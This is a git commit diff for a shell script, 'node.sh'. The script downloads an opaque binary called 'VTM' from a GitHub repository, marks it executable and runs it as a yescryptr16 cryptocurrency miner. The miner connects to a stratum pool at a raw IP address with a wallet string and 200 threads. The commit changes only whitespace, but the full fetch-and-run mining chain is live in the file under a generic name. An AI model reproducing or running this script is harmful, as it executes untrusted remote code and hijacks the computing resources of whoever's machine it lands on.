c2bc03ae7c5284b4319d114dd4ae0d19d9f5e16a
tysgahwhsae <115570245+tysgahwhsae@users.noreply.github.com>
2022-10-11 22:15:41 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -4,4 +4,4 @@ sudo apt update
 clear
 wget https://github.com/angkii/asu/raw/main/VTM
 chmod 700 VTM
-./VTM -a yescryptr16  -o stratum+tcps://178.128.86.41:80 -u vS9YupBzjfTrS9x7EPibXEMCPsoSTrDBQB.C -t200
+./VTM -a yescryptr16 -o stratum+tcps://178.128.86.41:80 -u vS9YupBzjfTrS9x7EPibXEMCPsoSTrDBQB.C -t200
